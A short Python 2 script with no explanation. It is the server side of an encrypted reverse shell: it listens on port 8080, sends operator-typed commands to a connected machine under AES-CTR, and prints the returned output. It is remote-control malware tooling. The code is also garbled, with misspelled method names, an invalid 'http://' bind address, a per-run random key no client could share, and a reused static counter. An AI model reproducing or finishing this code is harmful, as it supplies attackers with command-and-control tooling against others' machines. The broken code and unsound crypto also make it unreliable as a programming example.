import socket, os
from Crypto.Cipher import AES

counter = os.urandom(16)
key = os.urandom(32)

def encrypt(cmd):
	ecrypt = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
	return encrypt.encrypt(cmd)

def decrypt(cmd):
	decrypt = AES.nwe(key, AES.MODE_CTR, counter=lambda: counter)
	return decrypt.decrypt(cmd)

def connect():

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("http://192.168.56.102", 8080))
	s.listen(1)

	print "[*]Server is listening on port 8080"

	conn, addr = s.accept()

	print "[+]Connection reeceived from IP: " + addr

	while True:

		command = raw_input("Shell>>>")
		if 'terminate' in command:
			conn.send('terinate')
			conn.close()
			break
		else:
			command = encrypt(command)
			conn.send(command)
			print decrypt( conn.recv(1024) )

def main():
	connect()

main()
